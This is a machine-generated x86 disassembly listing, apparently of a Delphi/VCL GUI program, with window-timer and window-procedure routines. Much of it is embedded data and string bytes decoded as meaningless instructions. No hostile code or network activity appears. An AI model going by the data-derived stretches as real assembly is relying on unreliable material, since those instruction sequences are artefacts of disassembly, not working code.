add [ eax + 0x64004542 ] al
loop r-xdata
in eax 0x42
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
outsd
js r-xdata
jne r-xdata
inc ebx
je r-xdata
or al 0x41
outsd
js r-xdata
push esp
inc ebx
outsd
add [ eax - 0x14 ] bh
in eax 0x42
add [ edx + esi * 4 + 0x43 ] bh
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] dl
add [ 0x6c797453 ] al
je r-xdata
insb
insb
jae r-xdata
push cs
outsd
inc ebx
outsd
insd
jo r-xdata
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ esi + ebp * 8 ] bl
inc ebx
add al dh
loop r-xdata
inc esp
insb
outsd
jb r-xdata
shl [ eax - 0x18 ] 0x42
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] edx
imul eax [ edx ] 0x269ff00
add bh bh
add [ eax ] eax
outsd
js r-xdata
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
inc ebx
je r-xdata
hlt
add [ eax ] al
outsd
insb
outsd
jb r-xdata
[ ecx + 0x2 ]
add [ eax ] al
adc [ eax ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
je r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
str [ eax ]
outsd
inc esp
jb r-xdata
jne r-xdata
out 0x42 eax
add [ eax + 0x3a0042e6 ] bh
add [ eax ] cl
add [ esi + ecx - 0x93ffbe ] ah
inc edx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
test [ ebx ] cl
inc edx
add [ ebx + ecx + 0x42 ] bh
insb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
push 0x1473726f
dec ebx
inc esp
add [ edx + 0x1 ] ah
add bh bh
xor al 0x0
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
sbb eax 0x1c40042
inc ebx
add [ esi + eax ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or al 0x41
jne r-xdata
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
add al 0xe5
inc edx
add [ eax - 0x3b00fffe ] bl
push es
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
adc [ eax ] al
add eax 0x6c797453
add [ eax ] al
add [ edi ] cl
jo r-xdata
add [ ebx + 0x42e730c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ah
sbb eax 0x2a00042
add bh bh
or [ esi ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
add [ 0x6f6c6f43 ] al
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
jbe r-xdata
add [ eax ] al
adc eax 0x65420a00
insb
inc ebp
jae r-xdata
add [ esi ] cl
dec esi
outsd
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ esi ] cl
outsd
ja r-xdata
push eax
add [ eax ] eax
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
dec edi
jne r-xdata
add [ eax ] 0x0
dec edx
inc esp
add [ ebx + 0x1 ] ah
add bh bh
[ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] cl
pushad
sbb eax 0x29c0042
add bh bh
hlt
push 0xe8ff0000
mov eax [ eax + eax - 0x8 ]
jb r-xdata
hlt
jb r-xdata
jb r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
sbb eax r--data
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0x17ff0000 ] 0x0
add eax 0x6f6c6f43
insb
dec ecx
outsb
outsb
jb r-xdata
push ds
add [ esi ] cl
push eax
popad
jb r-xdata
adc [ eax ] al
cld
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a001d ] al
je r-xdata
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001c ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ edx ] ah
inc edx
add [ eax ] ch
add bh bh
call 0xfffffffff8432f86
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
add [ eax ] al
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ 0x65420a00 ] dl
adc al 0x0
or [ edx + 0x65 ] eax
jbe r-xdata
dec ebx
inc esp
add [ ebp + 0x1 ] ah
add bh bh
add [ fs : ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ eax + 0x61 ]
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40100074
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ah
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop edx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
js r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc al 0x8a
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
sub al 0x0
or cl [ edi + 0x6e ]
push ebp
jo r-xdata
outsd
ja r-xdata
inc esp
add al bh
hlt
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] ecx
inc esp
jb r-xdata
add [ eax ] al
sub [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080028 ] al
outsb
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
hlt
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070032 ] al
outsb
inc ebp
outsb
je r-xdata
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
add [ eax ] al
js r-xdata
inc ebx
push 0x65676e61
adc al 0x56
inc ecx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ edi + 0x6e ] cl
cmp eax [ eax + eax + 0x78 ]
je r-xdata
outsb
jpo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
[ eax ]
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
dec edi
jbe r-xdata
adc al 0x56
push eax
outsd
jo r-xdata
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0039 ] al
outsb
jo r-xdata
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or ecx [ edi + 0x6e ]
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
push ebx
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
jb r-xdata
add [ eax ] al
xor [ ebx ] 0x0
outsb
inc ebp
js r-xdata
push esi
outsb
dec edi
jb r-xdata
add al [ eax ]
[ eax ]
jo r-xdata
pop esi
or al 0xc7
inc esi
or [ eax ] dh
int1
jb r-xdata
add [ eax ] al
xor [ edi ] 0x0
or [ edi + 0x6e ] cl
push ebx
insb
arpl [ gs : esp + ebp * 4 + 0x41 ] si
inc esp
add [ eax ] al
add [ eax ] eax
push esi
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
call sub_4482b0
mov edx 0x41
mov eax ebx
call sub_4482d4
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
je r-xdata
jae r-xdata
jns r-xdata
je r-xdata
add [ eax ] al
sub [ edi ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc ecx
add [ eax ] ch
push esi
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941ed63
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002d ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
sub [ eax + eax ] 0xa
dec edi
outsb
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
mov esi eax
mov [ ebx + 0x16c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_42f130
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
inc esp
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
call sub_423b40
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_42f130
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e0c
and eax [ edx ]
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
push ebx
je r-xdata
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
dec ebx
jns r-xdata
inc esp
add al bl
add [ eax ] eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060033 ] al
adc al 0x56
jo r-xdata
inc edx
add [ edx + 0x2404a101 ] dh
inc edx
add al ch
outsb
dec esi
xor cl dh
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450524
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x41
mov eax ebx
add esp 0xfffffff0
call sub_4035dc
push es
dec edi
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
in al dx
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
sub_42efd4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403290
mov eax [ esi + 0x16c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450580
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42f010
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x160 ]
mov edx [ ebx + 0x168 ]
mov eax esi
call sub_4247e4
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_4247f0
mov eax [ esi + 0x10 ]
call sub_423dd8
sar eax 0x1
jns r-xdata
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x10 ]
call sub_423dd8
mov edi [ ebx + 0x48 ]
sub edi eax
inc edi
mov eax [ esi + 0x10 ]
call sub_423dd8
mov ebp [ ebx + 0x4c ]
sub ebp eax
inc ebp
mov eax [ esi + 0x10 ]
call sub_423dd8
test eax eax
jne r-xdata
adc eax 0x0
cmp ebp edi
jle r-xdata
dec edi
dec ebp
mov eax ebp
mov eax edi
jmp r-xdata
sub edi eax
sar edi 0x1
jns r-xdata
sub dl 0x2
je r-xdata
mov dl [ ebx + 0x170 ]
sub dl 0x1
je r-xdata
add [ esp ] edi
sub ebp eax
sar ebp 0x1
jns r-xdata
adc edi 0x0
sub dl 0x2
jne r-xdata
add [ esp + 0x4 ] ebp
mov edi eax
mov ebp eax
adc ebp 0x0
mov dl [ ebx + 0x170 ]
sub dl 0x2
jb r-xdata
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_4244a4
jmp r-xdata
sub dl 0x2
jb r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov edx eax
test edx edx
jns r-xdata
sub dl 0x2
jb r-xdata
sar edx 0x2
push edx
push edx
mov ecx [ esp + 0x14 ]
mov eax esi
mov edx [ esp + 0x10 ]
call sub_4244ec
jmp r-xdata
add edx 0x3
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_424358
jmp r-xdata
sub_42f16c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450524
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x69
mov eax esi
call sub_4482b0
mov edx 0x69
mov eax esi
call sub_4482d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42f1cc
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4247d4
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423fb4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x16a ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov dl 0x1
mov eax [ esi + 0x10 ]
call sub_423db0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4240d0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_4244a4
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
sub_42f240
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42f2c8
call sub_421860
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42f290
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42f33c
mov eax [ esi + 0x34 ]
call sub_421914
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42f2c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42f302
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f33c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42f3bb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3c2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
sub_42f418
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
cmc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
cmc
inc edx
add [ ebp + esi * 8 + 0x42 ] al
add [ edx + eax ] bl
add [ eax ] al
or al 0xc5
inc ebx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add dh dh
inc edx
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0x5600042 ] ah
inc esp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add al al
add eax 0x6c40044
inc esp
add [ ebx ] al
add [ ecx ] dl
mov ebp 0xffbaffbc
cmp dh dh
inc edx
add [ eax ] cl
test [ edx ] sub_42f6c8
or al 0x54
inc edi
jb r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x38 ]
inc [ ebx ]
xor [ esi - 0xeefffbc ] ch
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax + 0x7 ] dl
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ eax + 0x14004407 ] ch
enter 0x44 0x18
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
push eax
mov edx eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
mov eax edi
mov ecx [ eax ]
inc edx
jne r-xdata
xor edx edx
mov eax edi
call sub_448c68
mov [ edi + 0x124 ] esi
je r-xdata
call [ ecx + 0x64 ]
outsb
lea eax [ eax ]
pop eax
cmc
inc edx
add [ edi ] al
or al 0x54
inc edi
jb r-xdata
mov [ edi + 0x120 ] sub_42f9ac
mov edx esi
and al 0x1
add [ eax ] al
jne r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
add bh al
xchg [ eax ] esp
inc edx
jne r-xdata
je r-xdata
lodsb [ esi ]
stc
inc edx
add [ ebx - 0x7438742a ] cl
or bh bh
push ecx
push 0xdb84c78b
je r-xdata
add [ eax ] eax
add [ ecx + edi * 8 - 0x2974ffbe ] ch
outsb
pushad
hlt
sub_42f57c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_440560
mov edx edi
mov eax [ esi + 0x210 ]
call sub_4181b4
xor edx edx
mov eax edi
call sub_448a14
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_448c68
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42f9ac
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42f600
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_4184ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42f638
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42f69d
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440860
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42f6a2
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f6c8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_44e2c0
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_40348c
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42f708
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44e108
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_40348c
pop edx
pop esi
pop ebx
retn
sub_42f734
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43d234
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42f9e4
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42f7c4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42fa58
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403290
mov eax [ esi + 0x210 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450fbc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42f814
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
